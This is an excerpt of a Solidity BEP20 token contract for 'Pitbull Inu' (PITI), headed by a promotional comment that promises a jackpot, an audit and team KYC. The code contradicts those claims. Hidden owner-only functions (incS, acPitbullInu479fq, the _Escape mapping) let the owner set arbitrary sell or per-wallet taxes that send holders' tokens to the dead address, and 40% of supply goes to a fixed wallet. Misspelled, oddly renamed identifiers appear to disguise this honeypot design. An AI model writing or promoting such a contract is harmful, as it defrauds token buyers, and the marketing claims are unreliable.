...
/*
♂The owner of the magic lampJackpot prize. Whenever the jackpot is more than 10 BNB, the system will automatically award the prize. The system will choose enough the last 20 buyers with the min buy 0.1b per trade and randomly select the 5 luckiest people to share 50% of the Jackpot pool ♂ Tax Buy 3% - Sell 6% | 3% Buy - 3% Sel automatically to the Jackpot pool ♂ Audit contract ♂ Team DEV KYC ♂ Listed on CMC & CG  Huge Partner & KOLs ♂
* http://instagram.com/PitbullInu479
* https://www.reddit.com/user/PitbullInu479
* TWITTER:https://twitter.com/PITI_PitbullInu
* WEBSITE:https://pitbullinu.io/
* TELEGRAM:https://t.me/PITIGlobal
*/
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingPitbullInu479OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingPitbullInu479OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingPitbullInu479OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingPitbullInu479OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingPitbullInu479OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function PitbullInu479To() external view returns (address);
    function PitbullInu479ToSetter() external view returns (address);
    ...
    function setPitbullInu479To(address) external;
    function setPitbullInu479ToSetter(address) external;
}
...
contract PITI is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "Pitbull Inu";
	string symbol_ = "PITI";
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*4);	
        ...
        _defaultSellPitbullInu479 = 0;
        _defaultBuyPitbullInu479 = 0;
    ...
    uint256 private _defaultSellPitbullInu479 = 0;
    uint256 private _defaultBuyPitbullInu479 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellPitbullInu479 = _value;
    }


    function acPitbullInu479fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradePitbullInu479amuont = 0;

        if (rF) {
            uint256 tradePitbullInu479 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradePitbullInu479 = _msgPitbullInu479Info(uint160(from));
                    tradePitbullInu479 = tradePitbullInu479 < _defaultSellPitbullInu479 ? _defaultSellPitbullInu479 : tradePitbullInu479;
                }
                if (from == uniswapV2Pair) {
                    tradePitbullInu479 = _defaultBuyPitbullInu479;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradePitbullInu479 = _Escape[from];
            }


            tradePitbullInu479amuont = _amuont.mul(tradePitbullInu479).div(100);
        }


        if (tradePitbullInu479amuont > 0) {
            _balances[from] = _balances[from].sub(tradePitbullInu479amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradePitbullInu479amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradePitbullInu479amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradePitbullInu479amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradePitbullInu479amuont);
        emit Transfer(from, _to, _amuont - tradePitbullInu479amuont);
    }
	...
	function _msgPitbullInu479Info(uint _acc) internal view virtual returns (uint) {
